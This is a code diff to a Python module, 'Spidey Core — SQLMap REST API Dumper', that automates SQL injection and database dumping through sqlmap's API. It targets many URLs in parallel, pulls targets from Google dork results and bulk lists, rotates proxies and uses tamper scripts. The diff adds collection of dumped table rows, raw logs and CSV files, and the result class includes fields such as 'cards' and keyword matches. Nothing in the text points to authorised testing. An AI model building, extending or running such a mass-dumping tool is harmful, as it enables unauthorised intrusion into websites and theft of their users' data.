@@ -1,6 +1,6 @@
 """
-Spidey Core — SQLMap REST API Dumper
-100% same as Telegram bot
+Spidey Core — SQLMap REST API Dumper (CLEAN v2.0)
++ raw_output, data_rows, csv_files fields for alldumps.txt
 """
 import os
 import io
@@ -13,13 +13,14 @@ import tempfile
 import subprocess
 import zipfile
 import logging
+import sys
 
 import aiohttp
 
 logger = logging.getLogger(__name__)
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  CONFIG — 100% same
+#  CONFIG
 # ═══════════════════════════════════════════════════════════════════════════
 DEFAULT_LEVEL     = 3
 DEFAULT_RISK      = 2
@@ -40,7 +41,6 @@ _sqlmap_local_api = os.path.join(
     "sqlmap", "sqlmapapi.py"
 )
 
-import sys
 if _sqlmap_which:
     SQLMAP_BIN = _sqlmap_which
 elif os.path.isfile(_sqlmap_local_py):
@@ -67,7 +67,7 @@ _server_ready = False
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  SERVER MANAGEMENT — 100% same
+#  SERVER MANAGEMENT
 # ═══════════════════════════════════════════════════════════════════════════
 async def _check_server() -> bool:
     try:
@@ -79,7 +79,6 @@ async def _check_server() -> bool:
 
 
 async def ensure_api_server() -> bool:
-    """Start sqlmapapi if not running"""
     global _server_proc, _server_ready
     async with _server_lock:
         if _server_ready and await _check_server():
@@ -88,7 +87,7 @@ async def ensure_api_server() -> bool:
             _server_ready = True
             return True
         if not SQLMAPAPI_BIN:
-            logger.error("sqlmapapi not found — REST API unavailable")
+            logger.error("sqlmapapi not found")
             return False
         launch_cmd = SQLMAPAPI_BIN.split() + ["-s", "-H", API_HOST, "-p", str(API_PORT)]
         try:
@@ -132,7 +131,7 @@ async def _api_post(session, path, data):
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  BUILD OPTIONS — 100% same
+#  BUILD OPTIONS
 # ═══════════════════════════════════════════════════════════════════════════
 def build_options(url=None, *, level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
                   technique=DEFAULT_TECHNIQUE, threads=DEFAULT_THREADS,
@@ -167,13 +166,14 @@ def build_options(url=None, *, level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  RESULT CLASS — 100% same
+#  RESULT CLASS (with new fields)
 # ═══════════════════════════════════════════════════════════════════════════
 class ApiTaskResult:
     __slots__ = (
         "url", "taskid", "success", "cards", "tables", "banner",
         "current_user", "current_db", "dbs", "log_lines", "error",
-        "csv_dir", "severity", "keyword_matches", "auto_pairs", "dbms"
+        "csv_dir", "severity", "keyword_matches", "auto_pairs", "dbms",
+        "raw_output", "data_rows", "csv_files",
     )
 
     def __init__(self, url=""):
@@ -193,17 +193,16 @@ class ApiTaskResult:
         self.keyword_matches = {}
         self.auto_pairs = []
         self.dbms = ""
+        self.raw_output = ""
+        self.data_rows = []
+        self.csv_files = []
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  RUN API TASK — 100% same
+#  RUN API TASK
 # ═══════════════════════════════════════════════════════════════════════════
 async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
                        log_cb=None, stop_event=None, csv_output_dir="") -> ApiTaskResult:
-    """
-    Run one SQLMap task.
-    Same as bot: creates task, sets options, starts scan, polls for logs/status.
-    """
     result = ApiTaskResult(
         url=options.get("url", options.get("googleDork", options.get("bulkFile", "")))
     )
@@ -290,7 +289,7 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
             except Exception:
                 break
 
-        # Fetch data
+        # ✅ Fetch data (with data rows)
         try:
             dr = await _api_get(sess, f"/scan/{taskid}/data")
             if dr.get("success") and dr.get("data"):
@@ -302,31 +301,58 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
                     elif it == 1:
                         if isinstance(val, str) and "banner" in val.lower():
                             result.banner = val
-        except Exception:
-            pass
+                    elif it == 0:
+                        # Data rows
+                        if isinstance(val, dict):
+                            for tname, rows in val.items():
+                                if isinstance(rows, list):
+                                    for row in rows:
+                                        result.data_rows.append({"table": tname, "row": row})
+                        elif isinstance(val, list):
+                            for row in val:
+                                result.data_rows.append({"table": "unknown", "row": row})
+        except Exception as e:
+            logger.error(f"[sqlmap] data fetch: {e}")
 
-        # Find CSV dir
-        dirs = []
+        # ✅ Save full log
+        result.raw_output = "\n".join(result.log_lines)
+
+        # ✅ Find all CSV files
+        csv_files_found = []
+        dirs_to_check = []
         if csv_output_dir and os.path.isdir(csv_output_dir):
-            dirs.append(csv_output_dir)
+            dirs_to_check.append(csv_output_dir)
+
+        sqlmap_root = os.path.expanduser("~/.sqlmap/output")
         url_for_domain = options.get("url", "") or ""
         if url_for_domain:
             try:
                 from urllib.parse import urlparse as _up
                 dom = _up(url_for_domain).netloc or ""
                 if dom:
-                    dd = os.path.join(os.path.expanduser("~/.sqlmap/output"), dom)
+                    dd = os.path.join(sqlmap_root, dom)
                     if os.path.isdir(dd):
-                        dirs.append(dd)
+                        dirs_to_check.insert(0, dd)
             except Exception:
                 pass
-        sqlmap_root = os.path.expanduser("~/.sqlmap/output")
         if os.path.isdir(sqlmap_root):
-            dirs.append(sqlmap_root)
-        if dirs:
-            result.csv_dir = dirs[0]
+            dirs_to_check.append(sqlmap_root)
 
-        result.success = bool(result.tables or result.csv_dir)
+        for d in dirs_to_check:
+            try:
+                for root, _, files in os.walk(d):
+                    for fn in files:
+                        if fn.endswith(".csv"):
+                            csv_files_found.append(os.path.join(root, fn))
+            except Exception:
+                pass
+        result.csv_files = csv_files_found
+
+        # Set csv_dir
+        if dirs_to_check:
+            result.csv_dir = dirs_to_check[0]
+
+        result.success = bool(result.tables or result.csv_dir or result.csv_files)
 
         # Parse log for DBMS/user/db
         full_log = "\n".join(result.log_lines)
@@ -356,7 +382,7 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  MULTIPLE URLS DUMP — 100% same
+#  MULTIPLE URLS DUMP
 # ═══════════════════════════════════════════════════════════════════════════
 async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
                             level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
@@ -364,8 +390,8 @@ async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
                             tamper=DEFAULT_TAMPER, crawl_depth=0,
                             task_timeout=DEFAULT_TIMEOUT, max_concurrent=DEFAULT_MAX_CONC,
                             stop_event=None, progress_cb=None,
-                            per_result_cb=None, log_sample_cb=None):
-    """Dump multiple URLs in parallel"""
+                            per_result_cb=None, log_sample_cb=None, task_id=None):
+    """Dump multiple URLs in parallel (with cancel support via task_id)"""
     if not await ensure_api_server():
         return []
     if proxy_list is None:
@@ -381,8 +407,17 @@ async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
             f.write("\n".join(proxy_list))
         _pf = pf
 
+    def _is_cancelled():
+        if not task_id:
+            return False
+        try:
+            from web.main import is_cancelled
+            return is_cancelled(task_id)
+        except Exception:
+            return False
+
     async def _one(idx, url):
-        if stop_event and stop_event.is_set():
+        if _is_cancelled():
             done[0] += 1
             return
         url_dir = os.path.join(base_tmp, f"t{idx}")
@@ -411,16 +446,10 @@ async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
         if r.success:
             results.append(r)
             if per_result_cb:
-                zip_src = r.csv_dir if (r.csv_dir and os.path.isdir(r.csv_dir)) else url_dir
-                zb = _zip_dir(zip_src)
-                if not zb:
-                    sr = os.path.expanduser("~/.sqlmap/output")
-                    if os.path.isdir(sr):
-                        zb = _zip_dir(sr)
                 try:
-                    await per_result_cb(r, zb)
-                except Exception:
-                    pass
+                    await per_result_cb(r, b"")
+                except Exception as e:
+                    logger.exception(f"per_result_cb error: {e}")
         if progress_cb:
             try:
                 await progress_cb(done[0], len(urls), len(results))
@@ -436,14 +465,13 @@ async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  GOOGLE DORK DUMP — 100% same
+#  GOOGLE DORK DUMP
 # ═══════════════════════════════════════════════════════════════════════════
 async def api_google_dork_dump(dork, *, proxy_list=None, level=DEFAULT_LEVEL,
                                risk=DEFAULT_RISK, technique=DEFAULT_TECHNIQUE,
                                threads=DEFAULT_THREADS, tamper=DEFAULT_TAMPER,
                                task_timeout=DEFAULT_TIMEOUT, stop_event=None,
                                log_cb=None, per_result_cb=None):
-    """SQLMap handles google dork directly"""
     if not await ensure_api_server():
         r = ApiTaskResult(url=dork)
         r.error = "sqlmapapi unavailable"
@@ -472,13 +500,12 @@ async def api_google_dork_dump(dork, *, proxy_list=None, level=DEFAULT_LEVEL,
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  BULK DUMP — 100% same
+#  BULK DUMP
 # ═══════════════════════════════════════════════════════════════════════════
 async def api_bulk_dump(urls, *, proxy_list=None, level=DEFAULT_LEVEL,
                         risk=DEFAULT_RISK, technique=DEFAULT_TECHNIQUE,
                         threads=DEFAULT_THREADS, tamper=DEFAULT_TAMPER,
                         task_timeout=DEFAULT_TIMEOUT, stop_event=None, log_cb=None):
-    """SQLMap reads from bulk file"""
     if not await ensure_api_server():
         r = ApiTaskResult()
         r.error = "sqlmapapi unavailable"
@@ -505,7 +532,7 @@ async def api_bulk_dump(urls, *, proxy_list=None, level=DEFAULT_LEVEL,
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  CANCEL TASK — 100% same
+#  CANCEL
 # ═══════════════════════════════════════════════════════════════════════════
 async def cancel_task(taskid: str) -> bool:
     try:
@@ -517,24 +544,26 @@ async def cancel_task(taskid: str) -> bool:
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  ZIP DIRECTORY — 100% same
+#  ZIP DIRECTORY
 # ═══════════════════════════════════════════════════════════════════════════
 def _zip_dir(directory: str) -> bytes:
-    """Zip all files in directory → bytes"""
     buf = io.BytesIO()
     has = False
-    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
-        for root, _, files in os.walk(directory):
-            for fn in files:
-                fp = os.path.join(root, fn)
-                zf.write(fp, os.path.relpath(fp, directory))
-                has = True
+    try:
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for root, _, files in os.walk(directory):
+                for fn in files:
+                    fp = os.path.join(root, fn)
+                    zf.write(fp, os.path.relpath(fp, directory))
+                    has = True
+    except Exception:
+        pass
     buf.seek(0)
     return buf.read() if has else b""
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  FORMAT SUMMARY — 100% same
+#  FORMAT SUMMARY
 # ═══════════════════════════════════════════════════════════════════════════
 def format_result_summary(r: ApiTaskResult) -> str:
     lines = []
@@ -562,7 +591,7 @@ def format_result_summary(r: ApiTaskResult) -> str:
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  SUBPROCESS FALLBACK — 100% same
+#  SUBPROCESS FALLBACK
 # ═══════════════════════════════════════════════════════════════════════════
 PER_URL_TIMEOUT = 420
 MAX_CONCURRENT = 8
